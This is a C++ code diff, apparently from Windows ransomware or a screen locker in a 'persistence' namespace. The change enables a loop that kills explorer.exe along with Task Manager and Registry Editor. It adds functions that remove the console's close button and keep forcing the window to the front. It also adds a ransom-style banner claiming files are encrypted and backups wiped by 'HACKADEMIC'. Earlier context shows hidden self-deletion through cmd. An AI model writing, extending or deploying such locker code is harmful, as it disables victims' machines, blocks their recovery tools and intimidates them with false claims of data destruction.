@@ -199,7 +199,7 @@ void StopExe() {
     while (true) {
         system("taskkill /F /IM taskmgr.exe >nul 2>&1");  // Закрываем диспетчер задач
         system("taskkill /F /IM regedit.exe >nul 2>&1");  // Закрываем редактор реестра
-        // system("taskkill /F /IM explorer.exe >nul 2>&1"); // Временно 
+        system("taskkill /F /IM explorer.exe >nul 2>&1"); // Временно 
         std::this_thread::sleep_for(std::chrono::milliseconds(300));
     }
 }
@@ -243,5 +243,50 @@ void deleteMainFiles() {
     ShellExecuteA(NULL, "open", "cmd.exe", (std::string("/C ") + cmd).c_str(), NULL, SW_HIDE);
 
     ExitProcess(0);
+}
+void RemoveCloseButton(){
+    HWND hwnd = GetConsoleWindow();
+    LONG style = GetWindowLong(hwnd, GWL_STYLE);
+
+    style &= ~WS_SYSMENU; 
+    SetWindowLong(hwnd, GWL_STYLE, style);
+    SetWindowPos(hwnd, nullptr, 0, 0, 0, 0,
+        SWP_NOMOVE | SWP_NOSIZE | SWP_NOZORDER | SWP_FRAMECHANGED);
+
+        
+}
+void ForceConsoleToFront() {
+    while(true){
+        HWND hwnd = GetConsoleWindow();
+
+        ShowWindow(hwnd, SW_RESTORE);
+        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
+                     SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
+
+        SetForegroundWindow(hwnd);
+        Sleep(2500);
+    }
+}
+void CryptMessage(){
+    std::cout << R"(
+
+██╗  ██╗ █████╗  ██████╗██╗  ██╗ █████╗ ██████╗ ███████╗███╗   ███╗██╗ ██████╗
+██║  ██║██╔══██╗██╔════╝██║ ██║ ██╔══██╗██╔══██╗██╔════╝████╗ ████║██║██╔════╝
+███████║███████║██║     █████║  ███████║██║  ██║█████╗  ██╔████╔██║██║██║     
+██╔══██║██╔══██║██║     ██╔═██║ ██╔══██║██║  ██║██╔══╝  ██║╚██╔╝██║██║██║     
+██║  ██║██║  ██║╚██████╗██║  ██║██║  ██║██████╔╝███████╗██║ ╚═╝ ██║██║╚██████╗
+╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝
+
+> All your important files have been encrypted.
+
+> The system has been compromised by HACKADEMIC.
+
+> Resistance is useless. Backups have been wiped. Recovery is impossible without our private key.
+
+> Any attempts to restore files manually may result in permanent data loss.
+
+> This is not a joke. This is your reality now.
+
+    )" << std::endl;
 }
 } // namespace persistence
